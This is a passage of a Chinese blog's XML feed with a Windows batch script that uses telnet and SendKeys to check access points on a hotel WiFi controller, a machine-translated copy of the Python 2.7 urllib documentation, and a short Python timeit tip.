class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>ValueError: math domain error<br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> import </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows环境下的bat如何实现远程发送命令并执行</title>
      <link href="/2016/05/30/windows%E7%8E%AF%E5%A2%83bat%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E5%B9%B6%E6%89%A7%E8%A1%8C/"/>
      <url>/2016/05/30/windows%E7%8E%AF%E5%A2%83bat%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E5%B9%B6%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="脚本作用：-登录酒店WIFI-WAC控制器，然后查看AP在线情况。"><a href="#脚本作用：-登录酒店WIFI-WAC控制器，然后查看AP在线情况。" class="headerlink" title="脚本作用： 登录酒店WIFI  WAC控制器，然后查看AP在线情况。"></a>脚本作用： 登录酒店WIFI  WAC控制器，然后查看AP在线情况。<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs bat"><br><br><br><br><br>:: Version       :  v1.<span class="hljs-number">1</span><br>:: Author        :  zhuxinkai<br><br><br>@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> 〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓<br><span class="hljs-built_in">echo</span> 〓请在英文输入法模式下运行此脚本，因为为远程发送键盘输入命令方式，不同的输入法会导致不同的结果! 〓〓〓〓〓〓〓〓〓〓〓〓<br><span class="hljs-built_in">echo</span> 〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓 <br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><br><br><span class="hljs-built_in">echo</span> 〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓<br><span class="hljs-built_in">echo</span> 〓 脚本会临时生成telnet_tmp.vbs ,如果有杀毒软件提示生成的VBS，请选择信任，并重新运行此脚本。  〓〓〓〓〓〓〓〓〓〓〓〓〓<br><span class="hljs-built_in">echo</span> 〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓<br><br><br><br><br>:<span class="hljs-built_in">start</span><br>@<span class="hljs-built_in">echo</span> off<br><br><br><br><br>@<span class="hljs-built_in">echo</span> off <br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><br> <br> <br><span class="hljs-built_in">echo</span> 阅读提示后，按任意键继续。<br><br><span class="hljs-built_in">pause</span><br><br>@<span class="hljs-built_in">echo</span> off<br><br><br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> sh = WScript.CreateObject(&quot;Wscript.Shell&quot;) &gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> WScript.Sleep <span class="hljs-number">300</span> &gt;&gt;telnet_tmp.vbs<br><br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;open&quot;&gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;  &quot;&gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">222</span>&quot;&gt;&gt;telnet_tmp.vbs<br><br><br><span class="hljs-built_in">echo</span> WScript.Sleep <span class="hljs-number">300</span> &gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;&#123;ENTER&#125;&quot;&gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> WScript.Sleep <span class="hljs-number">1000</span> &gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;username&#123;ENTER&#125;&quot;&gt;&gt;telnet_tmp.vbs<br><br><br><span class="hljs-built_in">echo</span> WScript.Sleep <span class="hljs-number">1000</span> &gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;password&#123;ENTER&#125;&quot;&gt;&gt;telnet_tmp.vbs<br><br><br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;dis wlan ap all&quot; &gt;&gt; telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;&#123;ENTER&#125;&quot;&gt;&gt;telnet_tmp.vbs<br><br><span class="hljs-built_in">start</span> telnet<br><span class="hljs-keyword">call</span> telnet_tmp.vbs<br><span class="hljs-built_in">del</span> telnet_tmp.vbs<br><br><br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> bat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>urllib模块之python 3</title>
      <link href="/2016/04/27/python-urllib/"/>
      <url>/2016/04/27/python-urllib/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p><a href="/developer/doc/1198">Python</a><a href="/developer/chapter/16176">网络 | Internet</a>urllib<p></p><h1 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h1><p>注意</p><p>该<code>urllib</code>模块已经被分成部分和在Python 3重命名为<code>urllib.request</code>，<code>urllib.parse</code>，和<code>urllib.error</code>。该<a href="https://docs.python.org/2.7/glossary.html#term-2to3">2to3的</a>转换你的源代码时，Python 3的另外请注意，该工具会自动适应进口<code>urllib.request.urlopen()</code>在Python 3功能相当于<code>urllib2.urlopen()</code>并且<code>urllib.urlopen()</code>已被删除。</p><p>该模块提供了一个高级接口，用于通过万维网获取数据。特别是，该<code>urlopen()</code>函数与内置函数类似<code>open()</code>，但接受通用资源定位符（URL）而不是文件名。有些限制适用 - 它只能打开URL进行阅读，并且没有可用的查找操作。</p><p>在版本2.7.9中进行了更改：对于HTTPS URI，<code>urllib</code>默认情况下执行所有必需的证书和主机名检查。</p><p>警告</p><p>对于早于2.7.9的Python版本，urllib不会尝试验证HTTPS URI的服务器证书。使用需要您自担风险！</p><span id="more"></span><h2 id="1-高级界面"><a href="#1-高级界面" class="headerlink" title="1.高级界面"></a>1.高级界面</h2><p><code>urllib.urlopen(url[, data[, proxies[, context]]])</code></p><p>打开一个由URL表示的网络对象以供阅读。如果URL没有方案标识符，或者它有方案标识符，则会<code>file:</code>打开一个本地文件（没有<a href="https://docs.python.org/2.7/glossary.html#term-universal-newlines">通用换行符</a>）; 否则它会打开一个到网络上某个服务器的套接字。如果无法建立连接，<code>IOError</code>则引发异常。如果一切顺利，将返回一个类似文件的对象。这支持了以下方法：<code>read()</code>，<code>readline()</code>，<code>readlines()</code>，<code>fileno()</code>，<code>close()</code>，<code>info()</code>，<code>getcode()</code>和<code>geturl()</code>。它也对<a href="https://docs.python.org/2.7/glossary.html#term-iterator">迭代器</a>协议有适当的支持。一个警告：<code>read()</code>方法，如果size参数被省略或者是否定的，则可能直到数据流结束才读取; 在一般情况下，没有好方法可以确定来自套接字的整个流已被读取。</p><p>除<code>info()</code>，<code>getcode()</code>和<code>geturl()</code>方法，这些方法具有相同的界面，文件对象-见文件对象这份手册里。（但它不是内置的文件对象，所以它不能用于需要真正的内置文件对象的地方。）</p><p>该<code>info()</code>方法返回<code>mimetools.Message</code>包含与URL关联的元信息的类的一个实例。当方法是HTTP时，这些头部是服务器在检索到的HTML页面的头部（包括Content-Length和Content-Type）返回的头部。当方法是FTP时，如果服务器响应FTP检索请求传回一个文件长度（如现在一样），则会出现一个Content-Length头。如果可以猜出MIME类型，则会出现Content-Type标头。当方法是本地文件时，返回的头文件将包含表示文件上次修改时间的Date，给出文件大小的Content-Length和包含文件类型猜测的Content-Type。另请参阅<code>mimetools</code>模块的说明。</p><p>该<code>geturl()</code>方法返回页面的真实URL。在某些情况下，HTTP服务器会将客户端重定向到另一个URL。该<code>urlopen()</code>函数透明地处理这个问题，但在某些情况下，调用者需要知道客户端重定向到哪个URL。该<code>geturl()</code>方法可用于获取此重定向的URL。</p><p>该<code>getcode()</code>方法返回与响应一起发送的HTTP状态代码，或者<code>None</code>该URL不包含HTTP URL。</p><p>如果_URL_使用<code>http:</code>方案标识符，则可以给出可选的_数据_参数来指定<code>POST</code>请求（通常请求类型是<code>GET</code>）。的_数据_参数必须是在标准_应用程序/ x-WWW窗体-urlencoded_格式; 请参阅<code>urlencode()</code>下面的功能。</p><p>该<code>urlopen()</code>功能透明地与不需要认证的代理工作。在Unix或Windows环境中，在启动Python解释器之前，将环境变量<code>http_proxy</code>或<code>ftp_proxy</code>环境变量设置为标识代理服务器的URL。例如（这<code>&#39;%&#39;</code>是命令提示符）：</p><p>% http_proxy=”<a href="http://www.someproxy.com:3128&quot;">http://www.someproxy.com:3128&quot;</a><br>% export http_proxy<br>% python<br>…</p><p>该<code>no_proxy</code>环境变量可用于指定不应通过代理达到的主机; 如果设置，它应该是逗号分隔的主机名后缀列表，可选地<code>:port</code>附加后缀，例如<code>cern.ch,ncsa.uiuc.edu,some.host:8080</code>。</p><p>在Windows环境中，如果未设置代理环境变量，则代理设置将从注册表的“Internet设置”部分获取。</p><p>在Mac OS X环境中，<code>urlopen()</code>将从OS X系统配置框架中检索代理信息，可通过网络系统首选项面板进行管理。</p><p>或者，可选的_代理_参数可用于显式指定代理。它必须是字典映射方案名称以代理URL，其中空字典不会导致使用代理，并且<code>None</code>（默认值）会导致如上所述使用环境代理设置。例如：</p><p># Use <a href="http://www.someproxy.com:3128/">http://www.someproxy.com:3128</a> for HTTP proxying<br>proxies = {‘http’: ‘<a href="http://www.someproxy.com:3128&#39;}">http://www.someproxy.com:3128&#39;}</a><br>filehandle = urllib.urlopen(some_url, proxies=proxies)<br># Don’t use any proxies<br>filehandle = urllib.urlopen(some_url, proxies={})<br># Use proxies from environment - both versions are equivalent<br>filehandle = urllib.urlopen(some_url, proxies=None)<br>filehandle = urllib.urlopen(some_url)</p><p>目前不支持需要使用认证的代理; 这被视为实施限制。</p><p>该_情境_参数可以设置为一个<code>ssl.SSLContext</code>实例来配置如果使用SSL设置<code>urlopen()</code>使得HTTPS连接。</p><p>在版本2.3中更改：添加了_代理_支持。</p><p>在版本2.6中进行了更改：添加<code>getcode()</code>到返回的对象并支持<code>no_proxy</code>环境变量。</p><p>在版本2.7.9中更改：已添加_上下文_参数。所有必需的证书和主机名检查都是默认完成的。</p><p>自2.6版弃用：该<code>urlopen()</code>功能已在Python 3中被删除，以支持<code>urllib2.urlopen()</code>。</p><p><code>urllib.urlretrieve(url[, filename[, reporthook[, data]]])</code></p><p>如有必要，将由URL表示的网络对象复制到本地文件。如果URL指向本地文件，或者该对象的有效缓存副本存在，则不会复制该对象。返回一个元组<code>(filename, headers)</code>，其中_filename_是可以找到该对象的本地文件名，而_headers_是<code>info()</code>返回的对象的方法<code>urlopen()</code>（对于可能缓存的远程对象）。例外情况与之相同<code>urlopen()</code>。</p><p>第二个参数（如果存在）指定要复制到的文件位置（如果不存在，则该位置将是具有生成名称的临时文件）。第三个参数（如果存在的话）是一个钩子函数，在建立网络连接时会被调用一次，之后每个块被读取一次。该钩子将传递三个参数; 到目前为止传输的块的数量，以字节为单位的块大小以及文件的总大小。第三个参数可能<code>-1</code>在较旧的FTP服务器上，它们不响应检索请求而返回文件大小。</p><p>如果_URL_使用<code>http:</code>方案标识符，则可以给出可选的_数据_参数来指定<code>POST</code>请求（通常请求类型是<code>GET</code>）。的_数据_参数必须在标准_应用程序/ x-WWW窗体-urlencoded_格式; 请参阅<code>urlencode()</code>下面的功能。</p><p>在版本2.5中进行了更改：当它检测到可用数据量小于预期量（这是_Content-Length_报头报告的大小）时<code>urlretrieve()</code>将会增加。例如，当下载被中断时，会发生这种情况。<code>ContentTooShortError</code></p><p>该_内容长度_被视为一个下界：如果有更多的数据读取，<code>urlretrieve()</code>读取更多的数据，但如果较少的数据是可用的，它引发异常。</p><p>在这种情况下，您仍可以检索下载的数据，并将其存储在<code>content</code>异常实例的属性中。</p><p>如果未提供_Content-Length_标头，<code>urlretrieve()</code>则无法检查已下载数据的大小，只是将其返回。在这种情况下，您只需假定下载成功。</p><p><code>urllib._urlopener</code></p><p>公共职能<code>urlopen()</code>并<code>urlretrieve()</code>创建<code>FancyURLopener</code>该类的一个实例并用它来执行他们所请求的操作。要覆盖此功能，程序员可以创建<code>URLopener</code>or 的子类<code>FancyURLopener</code>，然后<code>urllib._urlopener</code>在调用所需的函数之前将该类的实例分配给该变量。例如，应用程序可能希望指定与定义不同的_User-Agent_标头<code>URLopener</code>。这可以用下面的代码来完成：</p><p>import urllib</p><p>class AppURLopener(urllib.FancyURLopener):<br>    version = “App/1.7”</p><p>urllib._urlopener = AppURLopener()</p><p><code>urllib.urlcleanup()</code></p><p>清除以前通过呼叫建立的缓存<code>urlretrieve()</code>。</p><h2 id="2-实用功能"><a href="#2-实用功能" class="headerlink" title="2.实用功能"></a>2.实用功能</h2><p><code>urllib.quote(string[, safe])</code></p><p>使用转义替换_字符串_中的特殊字符<code>%xx</code>。字母，数字和字符<code>&#39;_.-&#39;</code>从未被引用。默认情况下，此功能用于引用URL的路径部分。可选的_安全_参数指定不应引用的附加字符 - 其默认值为<code>&#39;/&#39;</code>。</p><p>Example: <code>quote(&#39;/~connolly/&#39;)</code> yields <code>&#39;/%7econnolly/&#39;</code>.</p><p><code>urllib.quote_plus(string[, safe])</code></p><p>就像<code>quote()</code>，但也用加号替换空格，这是在构建查询字符串进入URL时引用HTML表单值所需的。除非包含在_保险箱中，_否则原始字符串中的加号会被转义。它也没有_安全的_默认值<code>&#39;/&#39;</code>。</p><p><code>urllib.unquote(string)</code></p><p>用<code>%xx</code>它们的单字符替换换码。</p><p>Example: <code>unquote(&#39;/%7Econnolly/&#39;)</code> yields <code>&#39;/~connolly/&#39;</code>.</p><p><code>urllib.unquote_plus(string)</code></p><p>就像<code>unquote()</code>，但也用空格替换加号，以取消引用HTML表单值。</p><p><code>urllib.urlencode(query[, doseq])</code></p><p>将映射对象或两元素元组序列转换为“百分比编码”字符串，适合<code>urlopen()</code>作为可选_数据_参数传递给上面的元素。这对于将表单字段的字典传递给<code>POST</code>请求很有用。生成的字符串是一系列<code>key=value</code>由<code>&#39;&amp;&#39;</code>字符分隔的对，其中_键_和_值_都使用<code>quote_plus()</code>上面的引号。当使用两元素元组作为_查询_参数时，每个元组的第一个元素是一个键，第二个元素是一个值。价值元素本身可以是一个序列，在这种情况下，如果可选参数_doseq_被评估为<code>True</code>，单独的<code>key=value</code>对被分隔<code>&#39;&amp;&#39;</code>为密钥的值序列的每个元素生成。编码字符串中参数的顺序将与序列中参数元组的顺序相匹配。该<code>urlparse</code>模块提供的功能<code>parse_qs()</code>和<code>parse_qsl()</code>其用于解析查询字符串成Python数据结构。</p><p><code>urllib.pathname2url(path)</code></p><p>将_路径_的本地语法的路径名_路径_转换为URL的路径组件中使用的表单。这不会产生完整的网址。返回值将使用该<code>quote()</code>函数引用。</p><p><code>urllib.url2pathname(path)</code></p><p>将路径组件_路径_从百分比编码的URL 转换为路径的本地语法。这不接受完整的网址。此功能用于<code>unquote()</code>解码_路径_。</p><p><code>urllib.getproxies()</code></p><p>此帮助函数将代理服务器URL映射的方案字典返回。它以<code>&lt;scheme&gt;_proxy</code>大小写敏感的方式，首先为所有操作系统扫描环境变量，并在找不到它时，从Mac OS X系统配置Mac OS X和Windows系统注册表Windows查找代理信息。如果小写和大写环境变量都存在（并且不同意），则小写是首选。</p><p>注意</p><p>如果<code>REQUEST_METHOD</code>设置了环境变量（通常表示脚本正在CGI环境中运行），则环境变量<code>HTTP_PROXY</code>（大写<code>_PROXY</code>）将被忽略。这是因为该变量可以由客户端使用“Proxy：”HTTP标头注入。如果您需要在CGI环境中使用HTTP代理，请<code>ProxyHandler</code>明确使用，或确保变量名是小写（或至少<code>_proxy</code>后缀）。</p><p>注意</p><p>urllib还公开了某些实用功能，如splittype，splithost和其他解析URL到各种组件。但建议使用它<code>urlparse</code>来解析URL而不是直接使用这些函数。Python 3不从<code>urllib.parse</code>模块公开这些帮助函数。</p><h2 id="3-URL开启器对象"><a href="#3-URL开启器对象" class="headerlink" title="3. URL开启器对象"></a>3. URL开启器对象</h2><p><code>class urllib.URLopener([proxies[, context[, **x509]]])</code></p><p>打开和阅读URL的基类。除非你需要使用比其他方案来支持开放的对象<code>http:</code>，<code>ftp:</code>或者<code>file:</code>，你可能想使用<code>FancyURLopener</code>。</p><p>默认情况下，<code>URLopener</code>该类将发送一个_User-Agent_标头<code>urllib/VVV</code>，其中_VVV_是<code>urllib</code>版本号。应用程序可以通过子类定义它们自己的_User-Agent_头，<code>URLopener</code>或者在子类定义<code>FancyURLopener</code>中将类属性<code>version</code>设置为合适的字符串值。</p><p>可选的_代理_参数应该是字典映射方案名称到代理URL，其中空字典将代理完全关闭。它的默认值是<code>None</code>，在这种情况下，如果存在的话，将使用环境代理设置，如<code>urlopen()</code>上面的定义中所讨论的。</p><p>该_情境_参数可以是一个<code>ssl.SSLContext</code>实例。如果给定，它定义开启者用于建立HTTPS连接的SSL设置。</p><p>在_x509中_收集的其他关键字参数可用于在使用该<code>https:</code>方案时验证客户端。支持关键字_key_file_和_cert_file_以提供SSL密钥和证书; 两者都需要支持客户端身份验证。</p><p><code>URLopenerIOError</code>如果服务器返回错误代码，则对象将引发异常。</p><p><code>open(fullurl[, data])</code></p><p>使用适当的协议打开_fullurl_。此方法设置缓存和代理信息，然后使用其输入参数调用相应的open方法。如果该方案未被识别，<code>open_unknown()</code>则被调用。该_数据_参数的含义相同_数据_的说法<code>urlopen()</code>。</p><p><code>open_unknown(fullurl[, data])</code></p><p>可覆盖的界面打开未知的URL类型。</p><p><code>retrieve(url[, filename[, reporthook[, data]]])</code></p><p>检索_url_的内容并将其放在_文件名中_。返回值是由本地文件名和<code>mimetools.Message</code>包含响应头的对象（对于远程URL）或<code>None</code>（对于本地URL）组成的元组。调用者必须打开并读取_文件名_的内容。如果没有给出_文件名_并且URL指向本地文件，则返回输入文件名。如果URL非本地和_文件名_没有给出，则该文件的输出<code>tempfile.mktemp()</code>与输入URL的最后一个路径成分的后缀匹配的后缀。如果有_报告_给出，它必须是一个接受三个数字参数的函数。它将在每个数据块从网络中读取后调用。对于本地URL，_reporthook_被忽略。</p><p>如果_URL_使用<code>http:</code>方案标识符，则可以给出可选的_数据_参数来指定<code>POST</code>请求（通常请求类型是<code>GET</code>）。的_数据_参数必须在标准_应用程序/ x-WWW窗体-urlencoded_格式; 请参阅<code>urlencode()</code>下面的功能。</p><p><code>version</code></p><p>指定开启器对象的用户代理的变量。为了<code>urllib</code>告诉服务器它是一个特定的用户代理，在调用基础构造函数之前，在子类中将其设置为类变量或构造函数中。</p><p><code>class urllib.FancyURLopener(...)</code></p><p><code>FancyURLopener</code>子类<code>URLopener</code>为下列HTTP响应代码提供默认处理：301,302,303,307和401.对于上面列出的30x响应代码，_Location_标头用于获取实际的URL。对于401响应代码（需要认证），执行基本的HTTP认证。对于30x响应代码，递归受限于_maxtries_属性的值，默认值为10。</p><p>对于所有其他响应代码，将<code>http_error_default()</code>调用该方法，您可以在子类中重写以适当地处理错误。</p><p>注意</p><p>根据<a href="https://tools.ietf.org/html/rfc2616.html"><strong>RFC 2616的规定</strong></a>，301和302对POST请求的响应不得在没有用户确认的情况下自动重定向。实际上，浏览器确实允许自动重定向这些响应，将POST更改为GET，并<code>urllib</code>重现此行为。</p><p>构造函数的参数与那些参数相同<code>URLopener</code>。</p><p>注意</p><p>执行基本身份验证时，<code>FancyURLopener</code>实例将调用其<code>prompt_user_passwd()</code>方法。默认实现向用户询问控制终端上的所需信息。如果需要，子类可以重写此方法以支持更适当的行为。</p><p>本<code>FancyURLopener</code>类提供了应该被重载，以提供适当的行为一个额外的方法：</p><p><code>prompt_user_passwd(host, realm)</code></p><p>返回在指定的安全领域中对给定主机上的用户进行身份验证所需的信息。返回值应该是一个元组，<code>(user, password)</code>可用于基本认证。</p><p>实施提示在终端上提供这些信息; 应用程序应该重写此方法以在本地环境中使用适当的交互模型。</p><p><code>exception urllib.ContentTooShortError(msg[, content])</code></p><p>当<code>urlretrieve()</code>函数检测到下载的数据量小于预期量（由_Content-Length_标题给出）时，会引发此异常。该<code>content</code>属性存储下载的（并且假定被截断的）数据。</p><p>2.5版本中的新功能。</p><h2 id="4-urllib限制"><a href="#4-urllib限制" class="headerlink" title="4. urllib限制"></a>4. urllib限制</h2><ul><li><p>  目前，仅支持以下协议：HTTP，（版本0.9和1.0），FTP和本地文件。</p></li><li><p>  缓存功能<code>urlretrieve()</code>已被禁用，直到我找到时间来破解正确处理过期时间标题。</p></li><li><p>  应该有一个函数来查询一个特定的URL是否在缓存中。</p></li><li><p>  为了向后兼容，如果URL看起来指向本地文件，但文件无法打开，则使用FTP协议重新解释URL。这有时会导致混淆错误消息。</p></li><li><p>  的<code>urlopen()</code>和<code>urlretrieve()</code>功能可能会导致任意长时间的延迟，而等待网络连接被建立。这意味着使用这些函数而不使用线程来构建交互式Web客户端是很困难的。</p></li><li><p>  由<code>urlopen()</code>or 返回的<code>urlretrieve()</code>数据是服务器返回的原始数据。这可能是二进制数据（如图像），纯文本或（例如）HTML。HTTP协议在应答头中提供了类型信息，可以通过查看_Content-Type_头来检查。如果返回的数据是HTML，则可以使用该模块<code>htmllib</code>解析它。</p></li><li><p>  处理FTP协议的代码不能区分文件和目录。当尝试读取指向无法访问的文件的URL时，这可能会导致意外的行为。如果URL以a结尾<code>/</code>，则假定引用一个目录并将相应地处理。但是，如果尝试读取文件导致550错误（意思是无法找到URL或者由于权限原因而无法访问该URL），那么该路径将被视为目录以处理指定目录时的情况由一个URL但尾随<code>/</code>已经被关闭了。当您尝试获取读取权限使其无法访问的文件时，这可能会导致误导性结果; FTP代码将尝试读取它，以550错误失败，然后执行不可读文件的目录列表。如果需要细粒度控制，请考虑使用<code>ftplib</code>模块，子类<code>FancyURLopener</code>或更改__urlopener_以满足您的需求。</p></li><li><p>  该模块不支持使用需要认证的代理。这可能会在未来实施。</p></li><li><p>  虽然<code>urllib</code>模块包含解析和解析URL字符串的（未记录的）例程，但推荐的URL操作接口在模块中<code>urlparse</code>。</p></li></ul><h2 id="5-例子"><a href="#5-例子" class="headerlink" title="5.例子"></a>5.例子</h2><p>以下是使用该<code>GET</code>方法检索包含参数的URL 的示例会话：</p><blockquote><blockquote><p>&gt; import urllib<br>&gt; params = urllib.urlencode({‘spam’: 1, ‘eggs’: 2, ‘bacon’: 0})<br>&gt; f = urllib.urlopen(“<a href="http://www.musi-cal.com/cgi-bin/query?%25s&quot;">http://www.musi-cal.com/cgi-bin/query?%s&quot;</a> % params)<br>&gt; print f.read()</p></blockquote></blockquote><p>以下示例使用该<code>POST</code>方法：</p><blockquote><blockquote><p>&gt; import urllib<br>&gt; params = urllib.urlencode({‘spam’: 1, ‘eggs’: 2, ‘bacon’: 0})<br>&gt; f = urllib.urlopen(“<a href="http://www.musi-cal.com/cgi-bin/query&quot;">http://www.musi-cal.com/cgi-bin/query&quot;</a>, params)<br>&gt; print f.read()</p></blockquote></blockquote><p>以下示例使用明确指定的HTTP代理覆盖环境设置：</p><blockquote><blockquote><p>&gt; import urllib<br>&gt; proxies = {‘http’: ‘<a href="http://proxy.example.com:8080/&#39;}">http://proxy.example.com:8080/&#39;}</a><br>&gt; opener = urllib.FancyURLopener(proxies)<br>&gt; f = opener.open(“<a href="http://www.python.org&quot;/">http://www.python.org&quot;</a>)<br>&gt; f.read()</p></blockquote></blockquote><p>以下示例完全不使用代理，覆盖环境设置：</p><blockquote><blockquote><p>&gt; import urllib<br>&gt; opener = urllib.FancyURLopener({})<br>&gt; f = opener.open(“<a href="http://www.python.org/&quot;">http://www.python.org/&quot;</a>)<br>&gt; f.read()</p></blockquote></blockquote></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> urllib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 使用小技巧，timeit计算程序代码的执行时间。</title>
      <link href="/2016/04/24/python%E6%8A%80%E5%B7%A7-1/"/>
      <url>/2016/04/24/python%E6%8A%80%E5%B7%A7-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h4 id="用于计算常用的函数执行时间。"><a href="#用于计算常用的函数执行时间。" class="headerlink" title="用于计算常用的函数执行时间。"></a>用于计算常用的函数执行时间。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> timeit<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_sleep</span>(<span class="hljs-params">times</span>):</span><br>    time.sleep(times)<br>    <span class="hljs-built_in">print</span>(times)<br><br><span class="hljs-built_in">print</span>(timeit.timeit(<span class="hljs-keyword">lambda</span> :run_sleep(<span class="hljs-number">2</span>),number=<span class="hljs-number">5</span>))<br></code></pre></td></tr></table></figure><h4 id="熟悉下-lambda-的使用方法"><a href="#熟悉下-lambda-的使用方法" class="headerlink" title="熟悉下 lambda 的使用方法"></a>熟悉下 lambda 的使用方法</h4><p> Python3匿名函数lambda详解及使用示例<br>概述<br>匿名函数，顾名思义即没有名称的函数，和def定义的函数的最大区别在于匿名函数创建后返回函数本身（即匿名函数不需要return来返回值），表达式本身结果就是返回值，而def创建后则赋值给一个变量名，在Python中，我们利用关键词lambda创建匿名函数，以下是匿名函数lambda表达式的形式： lambda arg1,arg2,…..argn:expression 以下为一些lambda的特点：</p><p>lambda 